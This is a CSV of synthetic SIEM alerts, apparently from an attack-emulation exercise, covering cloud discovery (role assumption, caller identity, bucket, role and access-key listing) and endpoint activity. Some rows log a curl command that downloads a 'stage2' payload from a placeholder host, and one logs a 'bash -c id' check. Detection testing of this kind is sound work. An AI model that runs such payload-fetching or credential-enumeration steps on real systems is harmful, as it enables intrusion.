guid,source,name,timestamp,username,hostname,detection_type,entity_type,entity,category,host_ip,process,source_ip,executable,pid,source_geo,user_agent,message
c08fa8c4-e157-4dfa-9196-69d2ce9ba8bc,elk,AWS AssumeRoleWithWebIdentity from Kubernetes SA and External ASN,2026-07-30 16:48:06.334010+00:00,system:serviceaccount:lab-prod:svc-dataset-worker,,cloud alert,cloud user,system:serviceaccount:lab-prod:svc-dataset-worker,AssumeRoleWithWebIdentity,,,203.0.113.45,,,Frontier Lab Synthetic Telecom,,Synthetic STS AssumeRoleWithWebIdentity from Kubernetes service account via external ASN.
f66e7942-c4ab-48b5-9cbe-fb696feb76b8,elk,Anomalous Cloud Role Activity,2026-07-30 16:48:06.334010+00:00,system:serviceaccount:lab-prod:svc-dataset-worker,,cloud ml,cloud user,system:serviceaccount:lab-prod:svc-dataset-worker,AssumeRoleWithWebIdentity,,,203.0.113.45,,,Frontier Lab Synthetic Telecom,,Synthetic STS AssumeRoleWithWebIdentity from Kubernetes service account via external ASN.
2e0f044a-aa01-488d-a3c3-b7944f2272ea,elk,AWS STS GetCallerIdentity API Called for the First Time ,2026-07-30 16:48:06.334010+00:00,frontier-emu-export-20260730T165106Z,,cloud alert,cloud user,frontier-emu-export-20260730T165106Z,GetCallerIdentity,,,203.0.113.45,,,,,Synthetic AWS CloudTrail event: GetCallerIdentity via sts.amazonaws.com.
a3c3be8f-ffb3-49b9-9c89-be4dbe660397,elk,AWS EC2 Role GetCallerIdentity from New Source AS Organization,2026-07-30 16:48:06.334010+00:00,frontier-emu-export-20260730T165106Z,,cloud alert,cloud user,frontier-emu-export-20260730T165106Z,GetCallerIdentity,,,203.0.113.45,,,,,Synthetic AWS CloudTrail event: GetCallerIdentity via sts.amazonaws.com.
4a2ec34f-6fd9-4e80-bb5f-412f7d9e23d6,elk,AWS Discovery API Calls via CLI from a Single Resource,2026-07-30 16:48:06.334010+00:00,frontier-node-role,,cloud alert,cloud user,frontier-node-role,GetCallerIdentity,,,203.0.113.45,,,Frontier Synthetic Telecom export-20260730T165106Z,,Synthetic AWS CloudTrail event: GetCallerIdentity via sts.amazonaws.com.
54df5604-3f8c-4f57-a8e3-26dd5d267cc2,elk,AWS Discovery API Calls via CLI from a Single Resource,2026-07-30 16:48:06.334010+00:00,frontier-console,,cloud alert,cloud user,frontier-console,DescribeRegions,,,203.0.113.45,,,,aws-internal/3,Synthetic AWS CloudTrail event: DescribeRegions via ec2.amazonaws.com.
dd2319cc-9e57-497a-b28f-3be958061c4a,elk,AWS Discovery API Calls via CLI from a Single Resource,2026-07-30 16:48:06.334010+00:00,frontier-node-role,,cloud alert,cloud user,frontier-node-role,DescribeInstances,,,203.0.113.45,,,Frontier Synthetic Telecom export-20260730T165106Z,aws-cli,Synthetic AWS CloudTrail event: DescribeInstances via ec2.amazonaws.com.
a1c30111-9321-45b1-838d-81f5fe0d9239,elk,AWS Discovery API Calls via CLI from a Single Resource,2026-07-30 16:48:06.334010+00:00,frontier-node-role,,cloud alert,cloud user,frontier-node-role,DescribeVpcs,,,203.0.113.45,,,Frontier Synthetic Telecom export-20260730T165106Z,aws-cli,Synthetic AWS CloudTrail event: DescribeVpcs via ec2.amazonaws.com.
bbef2633-1e45-4224-9415-4ce697a56ad9,elk,AWS Discovery API Calls via CLI from a Single Resource,2026-07-30 16:48:06.334010+00:00,frontier-node-role,,cloud alert,cloud user,frontier-node-role,DescribeSecurityGroups,,,203.0.113.45,,,Frontier Synthetic Telecom export-20260730T165106Z,aws-cli,Synthetic AWS CloudTrail event: DescribeSecurityGroups via ec2.amazonaws.com.
7e0036e9-a0a9-4c7f-88ce-b299959bb366,elk,AWS Discovery API Calls via CLI from a Single Resource,2026-07-30 16:48:06.334010+00:00,frontier-node-role,,cloud alert,cloud user,frontier-node-role,ListBuckets,,,203.0.113.45,,,Frontier Synthetic Telecom export-20260730T165106Z,aws-cli,Synthetic AWS CloudTrail event: ListBuckets via s3.amazonaws.com.
6fc2cb74-0f66-42bf-a25c-f17f50093a4f,elk,Anomalous S3 Activity,2026-07-30 16:48:06.334010+00:00,frontier-node-role,,cloud alert,cloud user,frontier-node-role,ListBuckets,,,203.0.113.45,,,Frontier Synthetic Telecom export-20260730T165106Z,aws-cli,Synthetic AWS CloudTrail event: ListBuckets via s3.amazonaws.com.
de4922af-d28f-4817-b554-dcfb654ab2b4,elk,AWS Discovery API Calls via CLI from a Single Resource,2026-07-30 16:48:06.334010+00:00,frontier-node-role,,cloud alert,cloud user,frontier-node-role,ListRoles,,,203.0.113.45,,,Frontier Synthetic Telecom export-20260730T165106Z,aws-cli,Synthetic AWS CloudTrail event: ListRoles via iam.amazonaws.com.
6892c1f6-07dc-4240-9870-b8c308261788,elk,AWS Discovery API Calls via CLI from a Single Resource,2026-07-30 16:48:06.334010+00:00,frontier-node-role,,cloud alert,cloud user,frontier-node-role,ListAccessKeys,,,203.0.113.45,,,Frontier Synthetic Telecom export-20260730T165106Z,aws-cli,Synthetic AWS CloudTrail event: ListAccessKeys via iam.amazonaws.com.
9bd9b1e9-353f-4e28-b981-6b45a48e37c4,elk,AWS STS GetCallerIdentity API Called for the First Time,2026-07-30 16:48:06.334010+00:00,frontier-node-role,,cloud alert,cloud user,frontier-node-role,GetCallerIdentity,,,203.0.113.45,,,Frontier Synthetic Telecom export-20260730T165106Z,aws-cli,Synthetic AWS CloudTrail event: GetCallerIdentity via sts.amazonaws.com.
c0e3691d-7b86-4ce2-ad31-045da7d0a58c,elk,AWS EC2 Role GetCallerIdentity from New Source AS Organization,2026-07-30 16:48:06.334010+00:00,frontier-node-role,,cloud alert,cloud user,frontier-node-role,GetCallerIdentity,,,203.0.113.45,,,Frontier Synthetic Telecom export-20260730T165106Z,aws-cli,Synthetic AWS CloudTrail event: GetCallerIdentity via sts.amazonaws.com.
7785c761-61bb-4902-98a7-87e143fc4c8f,elk,AWS Discovery API Calls via CLI from a Single Resource,2026-07-30 16:48:06.334010+00:00,frontier-node-role,,cloud alert,cloud user,frontier-node-role,GetCallerIdentity,,,203.0.113.45,,,Frontier Synthetic Telecom export-20260730T165106Z,aws-cli,Synthetic AWS CloudTrail event: GetCallerIdentity via sts.amazonaws.com.
6ed86539-3572-4140-a91d-6cf46b952196,elk,Suspicious Child Execution via Web Server,2026-07-30 16:48:06.334010+00:00,svc-dataset-worker,lab-dataset-worker-01,endpoint alert,endpoint,lab-dataset-worker-01,linux,10.42.7.19,curl,,/usr/bin/curl,4242.0,,,Synthetic endpoint process telemetry: curl -s https://capture.frontier-emulation.invalid/stage2 -o /tmp/stage2.bin
7ab8e67d-e861-4ab4-8077-ab33d1fa1d88,elk,Anomalous Linux Process,2026-07-30 16:48:06.334010+00:00,svc-dataset-worker,lab-dataset-worker-01,endpoint alert,endpoint,lab-dataset-worker-01,linux,10.42.7.19,curl,,/usr/bin/curl,4242.0,,,Synthetic endpoint process telemetry: curl -s https://capture.frontier-emulation.invalid/stage2 -o /tmp/stage2.bin
140e009b-2ed7-428f-befd-dabf2bb29dae,elk,Suspicious Command Execution via Web Server,2026-07-30 16:48:07.334010+00:00,svc-dataset-worker,lab-dataset-worker-01,endpoint alert,endpoint,lab-dataset-worker-01,linux,10.42.7.19,bash,,/usr/bin/bash,4242.0,,,Synthetic endpoint process telemetry: bash -c id
